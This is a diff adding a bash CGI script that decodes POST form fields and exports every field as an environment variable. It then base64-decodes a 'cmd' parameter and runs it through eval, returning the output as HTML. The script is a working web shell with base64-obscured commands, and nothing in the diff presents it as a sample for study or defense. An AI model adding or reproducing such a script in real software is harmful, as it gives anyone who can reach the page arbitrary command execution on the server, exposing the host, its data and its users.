@@ -1,0 +1,60 @@
+#!/bin/bash
+echo -e "Content-type: text/html\n\n"
+function cgi_get_POST_vars(){
+    [ "$REQUEST_METHOD" != "POST" ] && return
+    [ ! -z "$QUERY_STRING_POST" ] && return
+    [ -z "$CONTENT_LENGTH" ] && return
+	read -N $CONTENT_LENGTH QUERY_STRING_POST
+    return
+}
+function cgi_decodevar(){
+    [ $# -ne 1 ] && return
+    local v t h
+    t="${1//+/ }%%"
+    while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
+        v="${v}${t%%\%*}"
+        t="${t#*%}"
+        if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
+            h=${t:0:2}
+            t="${t:2}"
+            v="${v}"`echo -e \\\\x${h}`
+        fi
+    done
+    echo "${v}"
+    return
+}
+function cgi_getvars(){
+    [ $# -lt 2 ] && return
+    local q p k v s
+    case $1 in
+        GET)
+            [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
+            ;;
+        POST)
+            cgi_get_POST_vars
+            [ ! -z "${QUERY_STRING_POST}" ] && q="${QUERY_STRING_POST}&"
+            ;;
+        BOTH)
+            [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
+            cgi_get_POST_vars
+            [ ! -z "${QUERY_STRING_POST}" ] && q="${q}${QUERY_STRING_POST}&"
+            ;;
+    esac
+    shift
+    s=" $* "
+    while [ ! -z "$q" ]; do
+        p="${q%%&*}"
+        k="${p%%=*}"
+        v="${p#*=}"
+        q="${q#$p&*}"
+        [ "$1" = "ALL" -o "${s/ $k /}" != "$s" ] && \
+            export "$k"="`cgi_decodevar \"$v\"`"
+    done
+    return
+}
+cgi_getvars POST ALL
+query=$(echo $cmd | base64 --decode)
+echo $(echo $check | base64 --decode)
+echo -e "<pre>\c"
+eval ${query}
+echo -e "</pre>\c"
